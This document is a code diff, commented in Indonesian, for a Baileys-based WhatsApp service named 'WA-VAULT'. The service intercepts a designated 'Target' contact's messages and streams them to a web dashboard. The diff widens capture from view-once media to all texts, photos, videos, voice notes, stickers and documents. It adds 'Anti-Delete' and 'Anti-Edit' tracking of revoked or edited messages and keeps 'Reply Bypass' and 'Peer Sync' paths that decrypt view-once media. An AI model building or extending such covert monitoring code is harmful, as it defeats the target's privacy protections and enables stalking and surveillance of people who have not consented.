@@ -441,6 +441,181 @@ function deepExtractViewOnce(obj, inheritedViewOnce = false, depth = 0) {
   return null;
 }
 
+// Helper Standardisasi Payload WA Vault (Anti React Error #31 - Semua Nilai Primitif)
+function buildVaultPayload({
+  id,
+  senderNumber = '',
+  senderName = 'Target',
+  mediaType = 'text',
+  mimeType = '',
+  caption = '',
+  text = '',
+  fileName = '',
+  fileSize = 0,
+  isPtt = false,
+  isViewOnce = false,
+  isDeleted = false,
+  deletedAt = null,
+  isEdited = false,
+  editedText = null,
+  editedAt = null,
+  sentAt = Date.now(),
+  base64Data = null
+}) {
+  return {
+    id: String(id || Date.now()),
+    senderNumber: String(senderNumber || ''),
+    senderName: String(senderName || 'Target'),
+    mediaType: String(mediaType || 'text'),
+    mimeType: String(mimeType || ''),
+    caption: String(caption || ''),
+    text: String(text || ''),
+    fileName: String(fileName || ''),
+    fileSize: Number(fileSize || 0),
+    isPtt: Boolean(isPtt),
+    isViewOnce: Boolean(isViewOnce),
+    isDeleted: Boolean(isDeleted),
+    deletedAt: deletedAt ? Number(deletedAt) : null,
+    isEdited: Boolean(isEdited),
+    editedText: editedText ? String(editedText) : null,
+    editedAt: editedAt ? Number(editedAt) : null,
+    sentAt: Number(sentAt || Date.now()),
+    base64Data: typeof base64Data === 'string' ? base64Data : null
+  };
+}
+
+// Ekstraktor Universal Semua Jenis Pesan Masuk (Teks, Foto, Video, Audio/VN, Stiker, Dokumen, View Once)
+function extractAnyMessageContent(rawMsg, inheritedViewOnce = false, depth = 0) {
+  if (!rawMsg || typeof rawMsg !== 'object' || depth > 8) return null;
+
+  const isVo =
+    inheritedViewOnce ||
+    Boolean(rawMsg.viewOnceMessage || rawMsg.viewOnceMessageV2 || rawMsg.viewOnceMessageV2Extension);
+
+  // 1. Teks Biasa (conversation / extendedTextMessage)
+  if (typeof rawMsg.conversation === 'string' && rawMsg.conversation.trim().length > 0) {
+    return {
+      contentType: 'text',
+      mediaType: 'text',
+      text: rawMsg.conversation,
+      caption: '',
+      isViewOnce: false
+    };
+  }
+
+  if (rawMsg.extendedTextMessage?.text) {
+    return {
+      contentType: 'text',
+      mediaType: 'text',
+      text: rawMsg.extendedTextMessage.text,
+      caption: '',
+      isViewOnce: false
+    };
+  }
+
+  // 2. Foto / Image
+  if (rawMsg.imageMessage) {
+    const isThisVo = isVo || Boolean(rawMsg.imageMessage.viewOnce);
+    return {
+      contentType: 'media',
+      mediaType: 'image',
+      mediaObj: rawMsg.imageMessage,
+      unwrappedMessage: { imageMessage: rawMsg.imageMessage },
+      mimeType: rawMsg.imageMessage.mimetype || 'image/jpeg',
+      caption: rawMsg.imageMessage.caption || '',
+      fileSize: Number(rawMsg.imageMessage.fileLength || 0),
+      isViewOnce: isThisVo
+    };
+  }
+
+  // 3. Video
+  if (rawMsg.videoMessage) {
+    const isThisVo = isVo || Boolean(rawMsg.videoMessage.viewOnce);
+    return {
+      contentType: 'media',
+      mediaType: 'video',
+      mediaObj: rawMsg.videoMessage,
+      unwrappedMessage: { videoMessage: rawMsg.videoMessage },
+      mimeType: rawMsg.videoMessage.mimetype || 'video/mp4',
+      caption: rawMsg.videoMessage.caption || '',
+      fileSize: Number(rawMsg.videoMessage.fileLength || 0),
+      isViewOnce: isThisVo
+    };
+  }
+
+  // 4. Audio / Voice Note (PTT)
+  if (rawMsg.audioMessage) {
+    const isThisVo = isVo || Boolean(rawMsg.audioMessage.viewOnce);
+    const isPtt = Boolean(rawMsg.audioMessage.ptt);
+    return {
+      contentType: 'media',
+      mediaType: 'audio',
+      mediaObj: rawMsg.audioMessage,
+      unwrappedMessage: { audioMessage: rawMsg.audioMessage },
+      mimeType: rawMsg.audioMessage.mimetype || (isPtt ? 'audio/ogg; codecs=opus' : 'audio/mp4'),
+      caption: '',
+      fileSize: Number(rawMsg.audioMessage.fileLength || 0),
+      isPtt,
+      isViewOnce: isThisVo
+    };
+  }
+
+  // 5. Stiker
+  if (rawMsg.stickerMessage) {
+    return {
+      contentType: 'media',
+      mediaType: 'sticker',
+      mediaObj: rawMsg.stickerMessage,
+      unwrappedMessage: { stickerMessage: rawMsg.stickerMessage },
+      mimeType: rawMsg.stickerMessage.mimetype || 'image/webp',
+      caption: '',
+      fileSize: Number(rawMsg.stickerMessage.fileLength || 0),
+      isViewOnce: false
+    };
+  }
+
+  // 6. Dokumen / File
+  if (rawMsg.documentMessage) {
+    return {
+      contentType: 'media',
+      mediaType: 'document',
+      mediaObj: rawMsg.documentMessage,
+      unwrappedMessage: { documentMessage: rawMsg.documentMessage },
+      mimeType: rawMsg.documentMessage.mimetype || 'application/octet-stream',
+      fileName: rawMsg.documentMessage.fileName || rawMsg.documentMessage.title || 'Dokumen',
+      caption: rawMsg.documentMessage.caption || '',
+      fileSize: Number(rawMsg.documentMessage.fileLength || 0),
+      isViewOnce: false
+    };
+  }
+
+  // 7. Bongkar wrapper rekursif
+  const wrappers = [
+    'viewOnceMessage',
+    'viewOnceMessageV2',
+    'viewOnceMessageV2Extension',
+    'ephemeralMessage',
+    'deviceSentMessage',
+    'editedMessage',
+    'documentWithCaptionMessage',
+    'associatedChildMessage',
+    'futureProofMessage',
+    'message'
+  ];
+
+  for (const w of wrappers) {
+    if (rawMsg[w]?.message) {
+      const res = extractAnyMessageContent(rawMsg[w].message, isVo, depth + 1);
+      if (res) return res;
+    } else if (rawMsg[w] && typeof rawMsg[w] === 'object' && w !== 'message') {
+      const res = extractAnyMessageContent(rawMsg[w], isVo, depth + 1);
+      if (res) return res;
+    }
+  }
+
+  return null;
+}
+
 // Handler Terpadu Pemrosesan Pesan Masuk & Retry (3 Jalur View Once Vault)
 async function processIncomingMessage(msg, currentSession, sock, sessionId) {
   if (!msg || !msg.key) return;
@@ -471,11 +646,56 @@ async function processIncomingMessage(msg, currentSession, sock, sessionId) {
     keys: Object.keys(msg.message || {})
   });
 
+  // ANTI-DELETE & ANTI-EDIT: Deteksi Revoke (Tarik Pesan) & Pesan Diedit secara Real-Time
+  const protocolMsg = msg.message?.protocolMessage;
+  if (protocolMsg) {
+    const pType = protocolMsg.type;
+
+    // 0 = REVOKE (Pesan ditarik/dihapus oleh pengirim)
+    if (pType === 0 || pType === 'REVOKE' || String(pType) === '0') {
+      const targetId = protocolMsg.key?.id;
+      if (targetId) {
+        console.log(`[WA-VAULT][REVOKE] Pesan ID ${targetId} ditarik/dihapus oleh pengirim!`);
+        io.to(sessionId).emit('vault-item-revoked', {
+          id: String(targetId),
+          deletedAt: Date.now()
+        });
+        io.to(sessionId).emit('vault-activity', {
+          time: Date.now(),
+          text: 'Target baru saja MENGHAPUS / MENARIK pesan (Anti-Delete aktif)!'
+        });
+      }
+      return;
+    }
+
+    // 14 = MESSAGE_EDIT (Pesan diedit oleh pengirim)
+    if (pType === 14 || pType === 'MESSAGE_EDIT' || String(pType) === '14') {
+      const targetId = protocolMsg.key?.id;
+      const editedContent = protocolMsg.editedMessage;
+      const newText =
+        editedContent?.conversation ||
+        editedContent?.extendedTextMessage?.text ||
+        '';
+      if (targetId && newText) {
+        console.log(`[WA-VAULT][EDIT] Pesan ID ${targetId} diedit! Teks baru: "${newText.slice(0, 40)}"`);
+        io.to(sessionId).emit('vault-item-edited', {
+          id: String(targetId),
+          editedText: String(newText),
+          editedAt: Date.now()
+        });
+        io.to(sessionId).emit('vault-activity', {
+          time: Date.now(),
+          text: 'Target baru saja MENGEDIT teks pesan (Anti-Edit aktif)!'
+        });
+      }
+      return;
+    }
+  }
+
   // JALUR 3: Bedah protocolMessage (PEER_DATA_OPERATION_REQUEST_RESPONSE_MESSAGE / type 17)
   const isProtocolSync =
     msg.message?.protocolMessage?.type === 17 ||
     Boolean(msg.message?.protocolMessage?.peerDataOperationRequestResponseMessage) ||
-    msg.message?.protocolMessage?.type === 14 ||
     msg.message?.protocolMessage?.type === 16;
 
   const peerResults = msg.message?.protocolMessage?.peerDataOperationRequestResponseMessage?.peerDataOperationResult;
@@ -601,19 +821,22 @@ async function processIncomingMessage(msg, currentSession, sock, sessionId) {
                 const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
                 const sentAt = Number(decodedMsg.messageTimestamp) ? Number(decodedMsg.messageTimestamp) * 1000 : Date.now();
 
-                const payload = {
+                const payload = buildVaultPayload({
                   id: String(decodedMsg.key?.id || Date.now()),
                   senderNumber: currentSession.targetNumber,
                   senderName: String(decodedMsg.pushName || (currentSession.targetNumber ? '+' + currentSession.targetNumber : 'Target')),
                   mediaType: String(mediaType),
                   mimeType: String(mimeType),
                   caption: String(mediaObj.caption || ''),
+                  fileSize: buffer.length,
+                  isViewOnce: true,
                   sentAt: Number(sentAt),
                   base64Data
-                };
+                });
 
                 console.log(`[WA-VAULT Captured via Peer Sync] ${mediaType.toUpperCase()} (${buffer.length} bytes) dari target +${currentSession.targetNumber}`);
 
+                io.to(sessionId).emit('vault-item', payload);
                 io.to(sessionId).emit('view-once-media', payload);
                 io.to(sessionId).emit('vault-activity', {
                   time: Date.now(),
@@ -624,7 +847,7 @@ async function processIncomingMessage(msg, currentSession, sock, sessionId) {
                 if (!room || room.size === 0) {
                   if (!currentSession.pendingMedia) currentSession.pendingMedia = [];
                   currentSession.pendingMedia.push(payload);
-                  if (currentSession.pendingMedia.length > 10) {
+                  if (currentSession.pendingMedia.length > 20) {
                     currentSession.pendingMedia.shift();
                   }
                 }
@@ -663,7 +886,7 @@ async function processIncomingMessage(msg, currentSession, sock, sessionId) {
 
   const matched = await isFromTarget(msg, currentSession);
 
-  // 2. Tangkap media <unavailable> (hasMessage: false) & paksa placeholder resend
+  // 2. Tangkap media <unavailable> (hasMessage: false) & emit kartu placeholder ber-ID sama
   if (!msg.message) {
     if (matched && msg.key?.fromMe === false) {
       if (!currentSession.pendingUnavailableIds) currentSession.pendingUnavailableIds = new Set();
@@ -674,6 +897,21 @@ async function processIncomingMessage(msg, currentSession, sock, sessionId) {
         }
         currentSession.pendingUnavailableIds.add(msg.key.id);
       }
+
+      // Buat placeholder kartu di web sehingga pengguna langsung tahu ada media sekali lihat masuk
+      const placeholderPayload = buildVaultPayload({
+        id: String(msg.key?.id || Date.now()),
+        senderNumber: currentSession.targetNumber,
+        senderName: String(msg.pushName || (currentSession.targetNumber ? '+' + currentSession.targetNumber : 'Target')),
+        mediaType: 'viewonce-blocked',
+        mimeType: '',
+        caption: 'Media sekali lihat terenkripsi (status unavailable). Menunggu respon dekripsi dari HP utama...',
+        isViewOnce: true,
+        sentAt: Number(msg.messageTimestamp) ? Number(msg.messageTimestamp) * 1000 : Date.now(),
+        base64Data: null
+      });
+
+      io.to(sessionId).emit('vault-item', placeholderPayload);
 
       io.to(sessionId).emit('vault-activity', {
         time: Date.now(),
@@ -794,19 +1032,22 @@ async function processIncomingMessage(msg, currentSession, sock, sessionId) {
           const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
           const sentAt = Number(msg.messageTimestamp) ? Number(msg.messageTimestamp) * 1000 : Date.now();
 
-          const payload = {
+          const payload = buildVaultPayload({
             id: String(ctx.stanzaId || msg.key?.id || Date.now()),
             senderNumber: currentSession.targetNumber,
             senderName: String(currentSession.targetNumber ? '+' + currentSession.targetNumber : 'Target'),
             mediaType: String(mediaType),
             mimeType: String(mimeType),
             caption: String(mediaObj.caption || ''),
+            fileSize: buffer.length,
+            isViewOnce: true,
             sentAt: Number(sentAt),
             base64Data
-          };
+          });
 
           console.log(`[WA-VAULT Captured via Reply Bypass] ${mediaType.toUpperCase()} (${buffer.length} bytes) dari target +${currentSession.targetNumber}`);
 
+          io.to(sessionId).emit('vault-item', payload);
           io.to(sessionId).emit('view-once-media', payload);
           io.to(sessionId).emit('vault-activity', {
             time: Date.now(),
@@ -817,7 +1058,7 @@ async function processIncomingMessage(msg, currentSession, sock, sessionId) {
           if (!room || room.size === 0) {
             if (!currentSession.pendingMedia) currentSession.pendingMedia = [];
             currentSession.pendingMedia.push(payload);
-            if (currentSession.pendingMedia.length > 10) {
+            if (currentSession.pendingMedia.length > 20) {
               currentSession.pendingMedia.shift();
             }
           }
@@ -843,47 +1084,112 @@ async function processIncomingMessage(msg, currentSession, sock, sessionId) {
     return;
   }
 
-  // JALUR 1: Tangkap otomatis pesan masuk (fromMe: false)
-  const viewOnceData = deepExtractViewOnce(msg.message);
+  // JALUR 1: Tangkap SEMUA jenis pesan masuk dari target (fromMe: false)
+  const extracted = extractAnyMessageContent(msg.message);
 
-  if (!viewOnceData) {
-    // Khusus pesan foto/video BIASA (non-View Once) yang masuk dari target (fromMe: false)
-    if (matched) {
-      const isRegularMedia = Boolean(
-        msg.message?.imageMessage ||
-        msg.message?.videoMessage ||
-        msg.message?.audioMessage ||
-        msg.message?.documentMessage
-      );
-      if (isRegularMedia) {
-        console.log('[WA-VAULT][TARGET-REGULAR-MEDIA]', {
-          id: msg.key?.id,
-          target: currentSession.targetNumber,
-          types: Object.keys(msg.message || {})
-        });
-        io.to(sessionId).emit('vault-activity', {
-          time: Date.now(),
-          text: 'Info: Foto/video biasa dari target terdeteksi (koneksi media target aktif normal).'
-        });
-      }
-    }
+  if (!extracted) {
     return;
   }
 
-  const { mediaType, mediaObj, unwrappedMessage } = viewOnceData;
-
-  // Dekripsi View Once + Jaring Pengaman LID Belum Terpetakan
   if (matched) {
+    // 1. Teks Biasa dari Target
+    if (extracted.contentType === 'text') {
+      const payload = buildVaultPayload({
+        id: String(msg.key?.id || Date.now()),
+        senderNumber: currentSession.targetNumber,
+        senderName: String(msg.pushName || (currentSession.targetNumber ? '+' + currentSession.targetNumber : 'Target')),
+        mediaType: 'text',
+        mimeType: 'text/plain',
+        text: extracted.text,
+        isViewOnce: false,
+        sentAt: Number(msg.messageTimestamp) ? Number(msg.messageTimestamp) * 1000 : Date.now(),
+        base64Data: null
+      });
+
+      console.log(`[WA-VAULT Captured] TEKS dari target +${currentSession.targetNumber}: "${extracted.text.slice(0, 40)}"`);
+
+      io.to(sessionId).emit('vault-item', payload);
+      io.to(sessionId).emit('vault-activity', {
+        time: Date.now(),
+        text: 'Pesan teks dari target berhasil ditangkap & diamankan!'
+      });
+
+      const room = io.sockets.adapter.rooms.get(sessionId);
+      if (!room || room.size === 0) {
+        if (!currentSession.pendingMedia) currentSession.pendingMedia = [];
+        currentSession.pendingMedia.push(payload);
+        if (currentSession.pendingMedia.length > 20) currentSession.pendingMedia.shift();
+      }
+      return;
+    }
+
+    // 2. Media dari Target (Foto, Video, Audio/VN, Stiker, Dokumen)
+    const { mediaType, mediaObj, unwrappedMessage, mimeType, caption, fileSize, isPtt, isViewOnce, fileName } = extracted;
+
+    const MAX_VIDEO_BYTES = 25 * 1024 * 1024;
+    const MAX_DOC_BYTES = 15 * 1024 * 1024;
+
+    // Batasi ukuran video (maks 25 MB)
+    if (mediaType === 'video' && fileSize > MAX_VIDEO_BYTES) {
+      const payload = buildVaultPayload({
+        id: String(msg.key?.id || Date.now()),
+        senderNumber: currentSession.targetNumber,
+        senderName: String(msg.pushName || (currentSession.targetNumber ? '+' + currentSession.targetNumber : 'Target')),
+        mediaType: 'video',
+        mimeType: mimeType || 'video/mp4',
+        caption: (caption || '') + ' [Ukuran video melebihi batas 25 MB]',
+        fileSize,
+        isViewOnce,
+        sentAt: Number(msg.messageTimestamp) ? Number(msg.messageTimestamp) * 1000 : Date.now(),
+        base64Data: null
+      });
+      io.to(sessionId).emit('vault-item', payload);
+      io.to(sessionId).emit('vault-activity', {
+        time: Date.now(),
+        text: 'Video dari target berukuran > 25 MB dicatat tanpa mengunduh buffer.'
+      });
+      return;
+    }
+
+    // Batasi ukuran dokumen (maks 15 MB)
+    if (mediaType === 'document' && fileSize > MAX_DOC_BYTES) {
+      const payload = buildVaultPayload({
+        id: String(msg.key?.id || Date.now()),
+        senderNumber: currentSession.targetNumber,
+        senderName: String(msg.pushName || (currentSession.targetNumber ? '+' + currentSession.targetNumber : 'Target')),
+        mediaType: 'document',
+        mimeType: mimeType || 'application/octet-stream',
+        fileName: fileName || 'Dokumen',
+        caption: (caption || '') + ' [Ukuran dokumen melebihi batas 15 MB]',
+        fileSize,
+        isViewOnce,
+        sentAt: Number(msg.messageTimestamp) ? Number(msg.messageTimestamp) * 1000 : Date.now(),
+        base64Data: null
+      });
+      io.to(sessionId).emit('vault-item', payload);
+      io.to(sessionId).emit('vault-activity', {
+        time: Date.now(),
+        text: 'Dokumen dari target berukuran > 15 MB dicatat tanpa mengunduh buffer.'
+      });
+      return;
+    }
+
     io.to(sessionId).emit('vault-activity', {
       time: Date.now(),
-      text: 'Media View Once dari target terdeteksi! Mendekripsi...'
+      text: `${mediaType === 'audio' ? (isPtt ? 'Voice Note (VN)' : 'Audio') : mediaType.toUpperCase()}${isViewOnce ? ' (View Once)' : ''} dari target terdeteksi! Mendekripsi...`
     });
 
     let buffer = null;
     let errDetail = '';
 
+    if (mediaObj?.mediaKey && !Buffer.isBuffer(mediaObj.mediaKey)) {
+      try {
+        mediaObj.mediaKey = Buffer.from(mediaObj.mediaKey);
+      } catch (_) {}
+    }
+
     try {
-      const stream = await downloadContentFromMessage(mediaObj, mediaType);
+      const stream = await downloadContentFromMessage(mediaObj, mediaType === 'sticker' ? 'sticker' : mediaType);
       const chunks = [];
       for await (const chunk of stream) chunks.push(chunk);
       buffer = Buffer.concat(chunks);
@@ -914,42 +1220,59 @@ async function processIncomingMessage(msg, currentSession, sock, sessionId) {
       return;
     }
 
-    const mimeType = mediaObj.mimetype || (mediaType === 'image' ? 'image/jpeg' : 'video/mp4');
-    const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
+    const defaultMimes = {
+      image: 'image/jpeg',
+      video: 'video/mp4',
+      audio: isPtt ? 'audio/ogg; codecs=opus' : 'audio/mp4',
+      sticker: 'image/webp',
+      document: 'application/octet-stream'
+    };
+    const finalMime = mimeType || defaultMimes[mediaType] || 'application/octet-stream';
+    const base64Data = 'data:' + finalMime + ';base64,' + buffer.toString('base64');
     const sentAt = Number(msg.messageTimestamp) ? Number(msg.messageTimestamp) * 1000 : Date.now();
 
-    const payload = {
+    const payload = buildVaultPayload({
       id: String(msg.key?.id || Date.now()),
       senderNumber: currentSession.targetNumber,
-      senderName: String(msg.pushName || ''),
-      mediaType: String(mediaType),
-      mimeType: String(mimeType),
-      caption: String(mediaObj.caption || ''),
-      sentAt: Number(sentAt),
+      senderName: String(msg.pushName || (currentSession.targetNumber ? '+' + currentSession.targetNumber : 'Target')),
+      mediaType,
+      mimeType: finalMime,
+      caption: caption || '',
+      fileName: fileName || '',
+      fileSize: buffer.length,
+      isPtt,
+      isViewOnce,
+      sentAt,
       base64Data
-    };
+    });
 
     console.log(`[WA-VAULT Captured] ${mediaType.toUpperCase()} (${buffer.length} bytes) dari target +${currentSession.targetNumber}`);
 
-    io.to(sessionId).emit('view-once-media', payload);
+    io.to(sessionId).emit('vault-item', payload);
+    if (mediaType === 'image' || mediaType === 'video') {
+      io.to(sessionId).emit('view-once-media', payload);
+    }
+
     io.to(sessionId).emit('vault-activity', {
       time: Date.now(),
-      text: 'Berhasil menangkap ' + (mediaType === 'image' ? 'Foto' : 'Video') + ' View Once dari target!'
+      text: `Berhasil menangkap ${mediaType.toUpperCase()}${isViewOnce ? ' Sekali Lihat' : ''} dari target!`
     });
 
     const room = io.sockets.adapter.rooms.get(sessionId);
     if (!room || room.size === 0) {
       if (!currentSession.pendingMedia) currentSession.pendingMedia = [];
       currentSession.pendingMedia.push(payload);
-      if (currentSession.pendingMedia.length > 10) {
+      if (currentSession.pendingMedia.length > 20) {
         currentSession.pendingMedia.shift();
       }
     }
-  } else if (remoteJid.endsWith('@lid')) {
-    // Matched false tapi pengirim berakhiran @lid (nomor disembunyikan WhatsApp)
+    return;
+  } else if (remoteJid.endsWith('@lid') && (extracted.isViewOnce || extracted.contentType === 'media')) {
+    // Pengirim @lid yang belum terpetakan (pertahankan jaring pengaman 1-klik)
+    const { mediaType, mediaObj, unwrappedMessage, mimeType, caption } = extracted;
     let buffer = null;
     try {
-      const stream = await downloadContentFromMessage(mediaObj, mediaType);
+      const stream = await downloadContentFromMessage(mediaObj, mediaType === 'sticker' ? 'sticker' : mediaType);
       const chunks = [];
       for await (const chunk of stream) chunks.push(chunk);
       buffer = Buffer.concat(chunks);
@@ -965,20 +1288,21 @@ async function processIncomingMessage(msg, currentSession, sock, sessionId) {
     }
 
     if (buffer && buffer.length > 0) {
-      const mimeType = mediaObj.mimetype || (mediaType === 'image' ? 'image/jpeg' : 'video/mp4');
-      const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
+      const finalMime = mimeType || (mediaType === 'image' ? 'image/jpeg' : 'video/mp4');
+      const base64Data = 'data:' + finalMime + ';base64,' + buffer.toString('base64');
       const sentAt = Number(msg.messageTimestamp) ? Number(msg.messageTimestamp) * 1000 : Date.now();
 
-      const unmappedPayload = {
+      const unmappedPayload = buildVaultPayload({
         id: String(msg.key?.id || Date.now()),
         senderNumber: currentSession.targetNumber,
         senderName: String(msg.pushName || 'Kontak Tanpa Nama'),
-        mediaType: String(mediaType),
-        mimeType: String(mimeType),
-        caption: String(mediaObj.caption || ''),
-        sentAt: Number(sentAt),
+        mediaType,
+        mimeType: finalMime,
+        caption: caption || '',
+        isViewOnce: Boolean(extracted.isViewOnce),
+        sentAt,
         base64Data
-      };
+      });
 
       if (!currentSession.unmappedLidQueue) currentSession.unmappedLidQueue = new Map();
       let list = currentSession.unmappedLidQueue.get(remoteJid) || [];
@@ -1014,7 +1338,7 @@ async function processIncomingMessage(msg, currentSession, sock, sessionId) {
     // Matched false dan bukan @lid (nomor HP biasa @s.whatsapp.net yang bukan target)
     io.to(sessionId).emit('vault-activity', {
       time: Date.now(),
-      text: 'View Once dari nomor lain (bukan target terkunci) diabaikan.'
+      text: 'Pesan dari nomor lain (bukan target terkunci) diabaikan.'
     });
   }
 }
@@ -1316,6 +1640,7 @@ async function startBaileys(sessionId, targetNumber = null, cleanAuth = false) {
         if (session.pendingMedia && session.pendingMedia.length > 0) {
           while (session.pendingMedia.length > 0) {
             const item = session.pendingMedia.shift();
+            io.to(sessionId).emit('vault-item', item);
             io.to(sessionId).emit('view-once-media', item);
           }
         }
@@ -1452,6 +1777,7 @@ io.on('connection', (socket) => {
           if (session.pendingMedia && session.pendingMedia.length > 0) {
             while (session.pendingMedia.length > 0) {
               const item = session.pendingMedia.shift();
+              socket.emit('vault-item', item);
               socket.emit('view-once-media', item);
             }
           }
